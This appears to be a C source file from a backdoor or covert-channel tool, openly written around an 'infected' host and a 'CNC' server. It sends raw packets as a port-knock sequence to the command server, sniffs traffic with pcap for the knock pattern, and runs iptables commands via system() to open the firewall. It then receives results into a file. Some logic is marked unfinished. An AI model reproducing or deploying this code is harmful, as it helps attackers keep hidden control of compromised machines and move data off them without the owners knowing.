#include "portknocking.h"


struct filter InitFilter(){
    struct filter Filter;
    Filter.amount = 3;
    Filter.port[0] = "8505";
    Filter.port_short[0] = 8505;
    Filter.port[1] = "8506";
    Filter.port_short[1] = 8506;
    Filter.port[2] = "8507";
    Filter.port_short[2] = 8507;
    return Filter;
}

void CreateFilter(struct filter Filter, char *buffer){
    strcat(buffer,TCP);
    for(int i = 0; i < Filter.amount; i++){
        strcat(buffer, PORTS);
        strcat(buffer, Filter.port[i]);
        if(i == Filter.amount-1){
        } else {
            strcat(buffer, OR);
        }
    }
    strcat(buffer, END);
}

void PortKnocking(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet, bool send, struct filter Filter){
    const struct sniff_tcp *tcp=0;
    const struct my_ip *ip;
    const char *payload;
    int size_ip;
    int size_tcp;
    int size_payload;

    if(send){
        char *srcip = INFECTEDIP;
        char *destip = CNCIP;
        unsigned short sport = SHPORT;
        unsigned short dport = SHPORT;
        unsigned char data[BUFSIZE] = "";
        printf("PORT KNOCKING\n");
        SendPattern(srcip, destip, sport, dport, data, Filter);
    } else {
        //parse the tcp packet and check for key and port knocking packets
        printf("TCP Packet\n");

        ip = (struct my_ip*)(packet + 14);
        size_ip = IP_HL(ip)*4;

        tcp = (struct sniff_tcp*)(packet + 14 + size_ip);
        size_tcp = TH_OFF(tcp)*4;

        if(size_tcp < 20){
            perror("TCP: Control packet length is incorrect");
            exit(1);
        }

        printf("Source port: %d\n", ntohs(tcp->th_sport));
        printf("Destination port: %d\n", ntohs(tcp->th_dport));
        payload = (u_char *)(packet + 14 + size_ip + size_tcp);

        size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);

        printf("PORT KNOCKING ON: %d\n", ntohs(tcp->th_dport));
        for(int k = 0; k < sizeof(pattern)/sizeof(int); k++){
            if(pattern[k] == tcp->th_dport){
                knocking[k] = 1;
            }
        }
        //fix this part
        if((knocking[0] == 1) && (knocking[1] == 1)){
            system(IPTABLES(INFECTEDIP));
            char *dip = INFECTEDIP;
            unsigned short sport = SHPORT;
            unsigned short dport = SHPORT;
            printf("WAITING FOR DATA\n");
            recv_results(dip, dport, RESULT_FILE);
            system(TURNOFF(INFECTEDIP));
            pcap_breakloop(interfaceinfo);
        }
    }


}

void SendPattern(char *sip, char *dip, unsigned short sport, unsigned short dport, unsigned char *data, struct filter Filter){
    for(int i = 0; i < Filter.amount; i++){
        covert_send(sip, dip, sport, Filter.port_short[i], data, 2);
    }
}
